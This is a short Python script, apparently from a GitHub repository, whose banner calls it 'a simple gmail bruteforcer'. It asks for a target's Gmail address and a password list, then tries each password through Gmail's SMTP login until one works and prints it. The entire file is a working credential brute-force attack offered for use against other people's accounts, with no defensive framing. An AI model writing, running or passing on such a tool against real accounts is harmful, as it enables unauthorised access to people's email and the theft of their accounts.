import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)      
smtpserver.ehlo()
smtpserver.starttls()

print("   _____         _       ")
print("  | __  |___ _ _| |_ ___ ")
print("  | __ -|  _| | |  _| -_|")
print("  |_____|_| |___|_| |___|\n")
print("version :V1.0 cretaed by jackjocke....")
print("a simple gmail bruteforcer...")
print("www.github.com/jackjocke" )

print('\n')



user = raw_input("enter the targets email adress :")
passwfile = raw_input("enter th password file name :")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
	     smtpserver.login(user, password)

	     print "[+] password found: %s" % password
             break
        except smtplib.SMTPAuthenticationError:
	     print " [!] password incorrect: %s" % password
